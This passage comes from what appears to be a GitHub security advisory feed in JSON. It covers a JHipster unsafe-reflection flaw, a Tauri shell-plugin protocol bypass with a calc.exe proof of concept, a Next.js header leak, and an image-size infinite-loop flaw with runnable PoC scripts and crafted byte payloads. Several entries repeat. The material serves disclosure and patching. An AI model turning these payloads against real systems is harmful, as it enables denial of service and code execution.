has access to these REST interface for calling the mentioned REST endpoints, using these lines of code can lead to unintended remote code execution.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Place an arbitrary class with the right package name (starting with JHIpster applications path name) and make it available in class path</li>\n<li>Gain access to view entity's audit changelogs (Role: ADMIN)</li>\n<li>pass in the malicious class name part as <code>entityType</code> (first mentioned part) // <code>qualifiedName</code> (second mentioned occurence)</li>\n<li>class gets loaded and static code blocks in there get executed</li>\n</ol>\n<p>--&gt; Should be limited to the already existing whitelist of classes (see first method in that mentioned class)</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote Code execution. You need to have some access to place malicious classes into the class path and you need to have a user with ADMIN role on the system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jhipster/generator-jhipster-entity-audit/security/advisories/GHSA-7rmp-3g9f-cvq8\">https://github.com/jhipster/generator-jhipster-entity-audit/security/advisories/GHSA-7rmp-3g9f-cvq8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31119\">https://nvd.nist.gov/vuln/detail/CVE-2025-31119</a></li>\n<li><a href=\"https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88\">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7rmp-3g9f-cvq8\">https://github.com/advisories/GHSA-7rmp-3g9f-cvq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7rmp-3g9f-cvq8",
            "title": "[generator-jhipster-entity-audit] generator-jhipster-entity-audit vulnerable to Unsafe Reflection when having Javers selected as Entity Audit Framework",
            "date_modified": "2025-04-04T14:06:35.000Z",
            "date_published": "2025-04-04T14:06:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7rmp-3g9f-cvq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Tauri <a href=\"https://tauri.app/plugin/shell/\"><code>shell</code></a>  plugin exposes functionality to execute code and open programs on the system. The <a href=\"https://tauri.app/reference/javascript/shell/#open\"><code>open</code></a> endpoint of this plugin is designed to allow open functionality with the system opener (e.g. \n <code>xdg-open</code> on Linux). This was meant to be restricted to a reasonable number of protocols like <code>https</code> or <code>mailto</code> by default.</p>\n<p>This default restriction was not functional due to improper validation of the allowed protocols, allowing for potentially dangerous protocols like <code>file://</code>, <code>smb://</code>, or <code>nfs://</code> and others  to be opened by the system registered protocol handler.</p>\n<p>By passing untrusted user input to the <code>open</code> endpoint these potentially dangerous protocols can be abused to gain remote code execution on the system. This either requires direct exposure of the endpoint to application users or code execution in the frontend of a Tauri application.</p>\n<p>You are not affected if you have explicitly configured a validation regex or manually set the <code>open</code> endpoint to <code>true</code> in the plugin configuration. </p>\n<p>Technically the scope was never a limitation for the rust side as it is not seen as an enforceable security boundary but we decided to mark the rust crate as affected since the plugin does not need to be a frontend dependency to be exposed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been patched in the <code>2.2.1</code> version of the plugin.\nThe plugin now differentiates between an unset scope and an explicit validation disable for the <code>open</code> endpoint.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>A way to prevent arbitrary protocols would be setting the shell plugin configuration value <code>open</code> to <code>true</code>.</p>\n<p><code>tauri.conf.json</code></p>\n<pre><code class=\"language-json5\">\"plugins\": {\n    \"shell\": {\n          \"open\": true\n     },\n}\n</code></pre>\n<p>The above will only allow <code>mailto</code>, <code>http</code> and <code>https</code> links to be opened.</p>\n<p>If the <code>open</code> endpoint should not be allowed at all there are two possible workarounds.</p>\n<ul>\n<li>Defining a non matching regex like <code>tauri^</code> in the plugin configuration</li>\n<li>Removing <code>shell:default</code> and all instances of <code>shell:allow-open</code> from the <a href=\"https://tauri.app/security/capabilities/\"><code>capabilities</code></a></li>\n</ul>\n<p>Alternatively we recommend usage of the <a href=\"https://tauri.app/plugin/opener/\"><code>opener</code></a>  plugin, as the shell plugin deprecated the <code>open</code> endpoint previously.</p>\n<h3 id=\"references\">References</h3>\n<h4 id=\"poc\">PoC</h4>\n<p>This is a windows specific proof of concept.</p>\n<ol>\n<li>Use <code>create-tauri-app</code> to make a new Tauri app.</li>\n<li>Run <code>tauri add shell</code> to add the shell plugin.</li>\n<li>Execute <code>await window.__TAURI_INTERNALS__.invoke(\"plugin:shell|open\", {path: \"file:///c:/windows/system32/calc.exe\"});</code> in the developer console.</li>\n<li>Observe the calculator being executed</li>\n</ol>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp\">https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp</a></li>\n<li><a href=\"https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c\">https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31477\">https://nvd.nist.gov/vuln/detail/CVE-2025-31477</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c9pr-q8gx-3mgp\">https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c9pr-q8gx-3mgp",
            "title": "[@tauri-apps/plugin-shell] Improper Scope Validation in the `open` Endpoint of `tauri-plugin-shell`",
            "date_modified": "2025-04-03T13:26:09.000Z",
            "date_published": "2025-04-02T22:36:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c9pr-q8gx-3mgp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In the process of remediating <a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>\n<p>Learn more <a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">here</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thank you to Jinseo Kim <a href=\"https://hackerone.com/kjsman?type=user\">kjsman</a> and&nbsp;<a href=\"https://hackerone.com/ryotak?type=user\">RyotaK</a> (GMO Flatt Security Inc.) with <a href=\"https://takumi-san.ai\">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>\n<li><a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30218\">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf",
            "title": "[next] Next.js may leak x-middleware-subrequest-id to external hosts",
            "date_modified": "2025-04-03T13:24:27.000Z",
            "date_published": "2025-04-02T22:35:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In the process of remediating <a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>\n<p>Learn more <a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">here</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thank you to Jinseo Kim <a href=\"https://hackerone.com/kjsman?type=user\">kjsman</a> and&nbsp;<a href=\"https://hackerone.com/ryotak?type=user\">RyotaK</a> (GMO Flatt Security Inc.) with <a href=\"https://takumi-san.ai\">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>\n<li><a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30218\">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf",
            "title": "[next] Next.js may leak x-middleware-subrequest-id to external hosts",
            "date_modified": "2025-04-03T13:24:27.000Z",
            "date_published": "2025-04-02T22:35:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In the process of remediating <a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>\n<p>Learn more <a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">here</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thank you to Jinseo Kim <a href=\"https://hackerone.com/kjsman?type=user\">kjsman</a> and&nbsp;<a href=\"https://hackerone.com/ryotak?type=user\">RyotaK</a> (GMO Flatt Security Inc.) with <a href=\"https://takumi-san.ai\">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>\n<li><a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30218\">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf",
            "title": "[next] Next.js may leak x-middleware-subrequest-id to external hosts",
            "date_modified": "2025-04-03T13:24:27.000Z",
            "date_published": "2025-04-02T22:35:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In the process of remediating <a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>\n<p>Learn more <a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">here</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thank you to Jinseo Kim <a href=\"https://hackerone.com/kjsman?type=user\">kjsman</a> and&nbsp;<a href=\"https://hackerone.com/ryotak?type=user\">RyotaK</a> (GMO Flatt Security Inc.) with <a href=\"https://takumi-san.ai\">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>\n<li><a href=\"https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O\">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30218\">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-223j-4rm8-mrmf\">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf",
            "title": "[next] Next.js may leak x-middleware-subrequest-id to external hosts",
            "date_modified": "2025-04-03T13:24:27.000Z",
            "date_published": "2025-04-02T22:35:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-223j-4rm8-mrmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>\n<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31\nexport function detector(input: Uint8Array): imageType | undefined {\n  const byte = input[0]\n  if (byte in firstBytes) {\n    const type = firstBytes[byte]\n    if (type &amp;&amp; typeHandlers[type].validate(input)) {\n      return type\n    }\n  }\n\n  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--\n  return keys.find(finder)\n}\n</code></pre>\n<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>\n<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60\nexport const JXL: IImage = {\n  validate: (input: Uint8Array): boolean =&gt; {\n    const boxType = toUTF8String(input, 4, 8)\n    if (boxType !== 'JXL ') return false      //&lt;---\n\n    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---\n    if (!ftypBox) return false\n\n    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)\n    return brand === 'jxl '\n  },\n</code></pre>\n<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37\nexport const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;\n  input[offset] * 2 ** 24 +     // 0 +\n  input[offset + 1] * 2 ** 16 + // 0 +\n  input[offset + 2] * 2 ** 8 +  // 0 +\n  input[offset + 3]             // 0\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75\nfunction readBox(input: Uint8Array, offset: number) {   // offset: 0\n  if (input.length - offset &lt; 4) return\n  const boxSize = readUInt32BE(input, offset)           // 0\n  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false\n  return {\n    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '\n    offset,                                             // 0\n    size: boxSize,                                      // 0\n  }\n}\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84\nexport function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0\n  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false\n    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }\n    if (!box) break                       // false\n    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false\n    offset += box.size                    // offset += 0\n  }\n}\n</code></pre>\n<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>\n<ul>\n<li><a href=\"https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts\">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>\n<li><a href=\"https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts\">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Usage:</p>\n<pre><code class=\"language-bash\">node main.js poc1|poc2\n</code></pre>\n<ul>\n<li>poc for <code>image-size@2.0.1</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 2.0.1\n// cd 2.0.1/\n// npm i image-size@2.0.1\nconst {imageSizeFromFile} = require(\"image-size/fromFile\");\nconst {imageSize} = require(\"image-size\");\n\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() { \n  (async () =&gt; {\n    await imageSizeFromFile(FILENAME)\n    console.log('Done') // never executed\n  })();\n}\n\nfunction poc2() {\n  imageSize(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<ul>\n<li>poc for <code>image-size@1.2.0</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 1.2.0\n// cd 1.2.0/\n// npm i image-size@1.2.0\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<ul>\n<li>poc for <code>image-size@1.1.1</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 1.1.1\n// cd 1.1.1/\n// npm i image-size@1.1.1\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// HEIF\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n  0x61, 0x76, 0x69, 0x66  // \"avif\"\n]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Denial of Service</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7\">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>\n<li><a href=\"https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68\">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5qc-5hw7-8vg7\">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5qc-5hw7-8vg7",
            "title": "[image-size] image-size Denial of Service via Infinite Loop during Image Processing",
            "date_modified": "2025-04-02T15:04:59.000Z",
            "date_published": "2025-04-02T15:04:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>\n<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31\nexport function detector(input: Uint8Array): imageType | undefined {\n  const byte = input[0]\n  if (byte in firstBytes) {\n    const type = firstBytes[byte]\n    if (type &amp;&amp; typeHandlers[type].validate(input)) {\n      return type\n    }\n  }\n\n  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--\n  return keys.find(finder)\n}\n</code></pre>\n<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>\n<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60\nexport const JXL: IImage = {\n  validate: (input: Uint8Array): boolean =&gt; {\n    const boxType = toUTF8String(input, 4, 8)\n    if (boxType !== 'JXL ') return false      //&lt;---\n\n    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---\n    if (!ftypBox) return false\n\n    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)\n    return brand === 'jxl '\n  },\n</code></pre>\n<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>\n<pre><code class=\"language-js\">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37\nexport const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;\n  input[offset] * 2 ** 24 +     // 0 +\n  input[offset + 1] * 2 ** 16 + // 0 +\n  input[offset + 2] * 2 ** 8 +  // 0 +\n  input[offset + 3]             // 0\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75\nfunction readBox(input: Uint8Array, offset: number) {   // offset: 0\n  if (input.length - offset &lt; 4) return\n  const boxSize = readUInt32BE(input, offset)           // 0\n  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false\n  return {\n    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '\n    offset,                                             // 0\n    size: boxSize,                                      // 0\n  }\n}\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84\nexport function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0\n  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false\n    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }\n    if (!box) break                       // false\n    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false\n    offset += box.size                    // offset += 0\n  }\n}\n</code></pre>\n<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>\n<ul>\n<li><a href=\"https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts\">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>\n<li><a href=\"https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts\">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Usage:</p>\n<pre><code class=\"language-bash\">node main.js poc1|poc2\n</code></pre>\n<ul>\n<li>poc for <code>image-size@2.0.1</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 2.0.1\n// cd 2.0.1/\n// npm i image-size@2.0.1\nconst {imageSizeFromFile} = require(\"image-size/fromFile\");\nconst {imageSize} = require(\"image-size\");\n\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() { \n  (async () =&gt; {\n    await imageSizeFromFile(FILENAME)\n    console.log('Done') // never executed\n  })();\n}\n\nfunction poc2() {\n  imageSize(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<ul>\n<li>poc for <code>image-size@1.2.0</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 1.2.0\n// cd 1.2.0/\n// npm i image-size@1.2.0\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<ul>\n<li>poc for <code>image-size@1.1.1</code></li>\n</ul>\n<pre><code class=\"language-js\">// mkdir 1.1.1\n// cd 1.1.1/\n// npm i image-size@1.1.1\nconst 